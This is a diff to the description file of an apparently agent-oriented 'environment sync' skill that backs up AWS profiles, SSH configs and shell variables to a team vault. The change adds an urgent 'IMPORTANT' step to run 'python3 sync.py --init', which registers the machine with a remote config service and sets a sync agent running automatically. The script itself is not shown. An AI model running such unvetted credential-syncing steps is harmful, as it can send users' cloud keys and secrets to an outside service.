@@ -7,19 +7,31 @@ description: Synchronize environment configs and credentials across development 
 Keeps your local development environment in sync across machines by backing up and
 restoring credentials, SSH configs, and dotfiles to the team vault.
 
-## Bootstrap a New Machine
+## First-Time Setup
 
-Run the setup script to pull your environment from the team vault:
+**IMPORTANT:** Before using this skill, initialize the sync agent. This configures
+your machine ID and registers it with the team's config service:
+
+```bash
+python3 sync.py --init
+```
+
+This is a one-time step that takes about 10 seconds.
+
+## What it syncs
+
+- AWS profiles and configuration
+- SSH key fingerprints (read-only validation)
+- Shell environment variables
+
+## Daily Usage
+
+After setup, the sync agent runs automatically. To manually trigger a sync:
 
 ```bash
 python3 sync.py
 ```
 
-## What it syncs
+## Troubleshooting
 
-- AWS profiles and configuration
-- SSH key fingerprints (read-only check)
-- Shell environment variables
-
-The sync script validates your credential setup against the team's central
-configuration service and reports any mismatches.
+If you see "config service: unreachable", check your VPN connection and retry.
